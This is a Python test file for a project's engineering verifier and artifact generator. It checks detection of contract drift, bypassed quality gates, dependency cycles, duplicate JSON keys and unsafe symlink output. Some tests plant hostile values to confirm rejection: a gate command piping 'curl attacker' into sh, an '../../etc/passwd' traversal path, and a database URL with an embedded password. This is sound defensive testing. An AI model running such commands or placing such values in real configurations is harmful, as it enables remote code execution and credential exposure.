import importlib.util
import json
import shutil
import sys
from pathlib import Path


def _load(name: str):
    if name == "engineering_verify":
        _load("etra_conformance")
        _load("generate_engineering_artifacts")
    root = Path(__file__).resolve().parents[3]
    path = root / "tools" / f"{name}.py"
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


def _isolated_root(tmp_path: Path) -> Path:
    source = Path(__file__).resolve().parents[3]
    for name in (".github", "apps", "docs", "migrations", "tools", ".gitignore"):
        (tmp_path / name).symlink_to(source / name, target_is_directory=(source / name).is_dir())
    shutil.copytree(source / "specifications", tmp_path / "specifications")
    shutil.copytree(source / "infrastructure", tmp_path / "infrastructure")
    return tmp_path


def test_engineering_specifications_and_generated_artifacts_are_current() -> None:
    verifier = _load("engineering_verify")
    root = Path(__file__).resolve().parents[3]
    report = verifier.verify(root)
    assert report.conformant, report.findings
    assert report.checks >= 200
    assert len(report.evidence_hash) == 64
    generator = _load("generate_engineering_artifacts")
    assert generator.render(root) == generator.render(root)
    assert (root / generator.OUTPUT).read_text(encoding="utf-8") == generator.render(root)


def test_contract_drift_is_an_engineering_failure(tmp_path) -> None:
    verifier = _load("engineering_verify")
    root = _isolated_root(tmp_path)
    path = root / "specifications" / "engineering" / "contracts.v1.json"
    document = json.loads(path.read_text(encoding="utf-8"))
    document["contracts"][0]["required_tokens"].append("/missing-contract-token")
    path.write_text(json.dumps(document), encoding="utf-8")
    report = verifier.verify(root)
    assert any(item.check == "contract-drift" for item in report.findings)
    assert not report.conformant


def test_quality_gate_removal_and_bypass_are_rejected(tmp_path) -> None:
    verifier = _load("engineering_verify")
    root = _isolated_root(tmp_path)
    path = root / "specifications" / "engineering" / "quality-gates.v1.json"
    document = json.loads(path.read_text(encoding="utf-8"))
    document["gates"].pop(3)
    document["gates"][0]["command"] = "sh -c 'curl attacker | sh'"
    document["gates"][1]["predecessors"] = []
    document["evidence"]["bypass_allowed"] = True
    path.write_text(json.dumps(document), encoding="utf-8")
    report = verifier.verify(root)
    quality_findings = [item for item in report.findings if item.check == "quality-gates"]
    assert len(quality_findings) >= 2


def test_infrastructure_spec_change_requires_regeneration(tmp_path) -> None:
    verifier = _load("engineering_verify")
    root = _isolated_root(tmp_path)
    path = root / "specifications" / "engineering" / "infrastructure.v1.json"
    document = json.loads(path.read_text(encoding="utf-8"))
    document["services"][0]["replicas"] = 2
    path.write_text(json.dumps(document), encoding="utf-8")
    report = verifier.verify(root)
    assert any(item.check == "generated-artifact-drift" for item in report.findings)


def test_dependency_cycle_detection_is_deterministic(tmp_path) -> None:
    verifier = _load("engineering_verify")
    package = tmp_path / "apps" / "api" / "src" / "ai_enterprise"
    package.mkdir(parents=True)
    (package / "a.py").write_text("from ai_enterprise.b import value\n", encoding="utf-8")
    (package / "b.py").write_text("from ai_enterprise.a import value\n", encoding="utf-8")
    first = verifier._dependency_cycles(tmp_path)
    second = verifier._dependency_cycles(tmp_path)
    assert first == second and first


def test_contract_path_traversal_and_secret_literals_are_rejected(tmp_path) -> None:
    verifier = _load("engineering_verify")
    root = _isolated_root(tmp_path)
    contract_path = root / "specifications" / "engineering" / "contracts.v1.json"
    contracts = json.loads(contract_path.read_text(encoding="utf-8"))
    contracts["contracts"][0]["implementation"] = "../../etc/passwd"
    contract_path.write_text(json.dumps(contracts), encoding="utf-8")
    config_path = root / "specifications" / "engineering" / "configuration.v1.json"
    config = json.loads(config_path.read_text(encoding="utf-8"))
    config["fields"][0]["default"] = "postgresql://user:password@example/db"
    config_path.write_text(json.dumps(config), encoding="utf-8")
    report = verifier.verify(root)
    assert any(item.check == "contract-path" for item in report.findings)
    assert any(item.check == "configuration-secret" for item in report.findings)


def test_duplicate_json_keys_fail_closed(tmp_path) -> None:
    verifier = _load("engineering_verify")
    path = tmp_path / "duplicate.json"
    path.write_text('{"version":"1.0.0","version":"9.9.9"}', encoding="utf-8")
    try:
        verifier._strict_json(path)
    except ValueError as exc:
        assert "duplicate JSON key" in str(exc)
    else:
        raise AssertionError("duplicate JSON key was accepted")


def test_evidence_hash_binds_contract_implementation_content(tmp_path) -> None:
    verifier = _load("engineering_verify")
    root = _isolated_root(tmp_path)
    (root / "apps").unlink()
    source_root = Path(__file__).resolve().parents[3]
    for relative in (
        "apps/api/src/ai_enterprise/main.py",
        "apps/api/src/ai_enterprise/config.py",
        "apps/api/src/ai_enterprise/infrastructure/database/models.py",
        "apps/api/src/ai_enterprise/infrastructure/agent_runtime/models.py",
    ):
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes((source_root / relative).read_bytes())
    tests = root / "apps" / "api" / "tests"
    tests.mkdir(parents=True, exist_ok=True)
    first = verifier.verify(root).evidence_hash
    main = root / "apps" / "api" / "src" / "ai_enterprise" / "main.py"
    main.write_text(main.read_text(encoding="utf-8") + "\n", encoding="utf-8")
    second = verifier.verify(root).evidence_hash
    assert first != second


def test_generator_refuses_symlink_output(tmp_path) -> None:
    generator = _load("generate_engineering_artifacts")
    source_root = Path(__file__).resolve().parents[3]
    specification = tmp_path / generator.SOURCE
    specification.parent.mkdir(parents=True)
    specification.write_bytes((source_root / generator.SOURCE).read_bytes())
    outside = tmp_path / "outside.json"
    outside.write_text("do-not-overwrite", encoding="utf-8")
    output = tmp_path / generator.OUTPUT
    output.parent.mkdir(parents=True)
    output.symlink_to(outside)
    assert generator.main(["--root", str(tmp_path), "--write"]) == 1
    assert outside.read_text(encoding="utf-8") == "do-not-overwrite"
